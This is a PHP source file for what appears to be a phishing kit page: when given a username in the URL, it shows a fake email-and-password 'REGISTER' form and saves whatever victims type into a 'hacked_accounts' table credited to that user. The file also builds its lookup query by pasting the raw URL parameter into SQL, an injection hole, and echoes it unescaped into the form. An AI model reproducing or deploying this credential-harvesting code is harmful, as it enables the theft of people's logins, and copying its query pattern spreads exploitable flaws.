<?php 
	include 'config.php';



if(isset($_GET['u'])){
	$link = $_GET['u'];
	$query_check = mysqli_query($con, "SELECT * FROM user WHERE username='$link'");
	$rowa = mysqli_fetch_array($query_check);
	$link_db = $rowa['username'];
	if($link == $link_db){
		echo '
<br><br><br>
<div class="login-register d-flex justify-content-center col-md-12">
<form action="web.php?u='.$link.'" method="POST">
        <input type="email" name="email" placeholder="email">
        <br><br>
        <input type="password" name="password" placeholder="Password">
        <br><br>
        <input type="submit" name="submit_hack" value="REGISTER">
        <br>
       
      </form>
</div>

		';
		if(isset($_POST['submit_hack'])){
			$email = mysqli_real_escape_string($con,$_POST['email']);
			$password = mysqli_real_escape_string($con,$_POST['password']);
			$query_insert = mysqli_query($con, "INSERT INTO `hacked_accounts` (`id`, `email`, `password`, `hacked_by`) VALUES (NULL, '$email', '$password', '$link')");
			

		}
	}
	else{
		echo "WRONG USERNAME, PLEASE TYPE A CORRECT USERNAME TO ACCESS THIS PAGE";
	}
}
else{
	echo "404 LINK NOT FOUND";
}

?>
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>

<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<style>
@font-face {
  font-family: HACKED;
  src: url(HACKED.ttf);
}
</style>
<title>H4CK3D</title>
</head>
<body>
	<br><br><br>
 
      
</body>
</html>
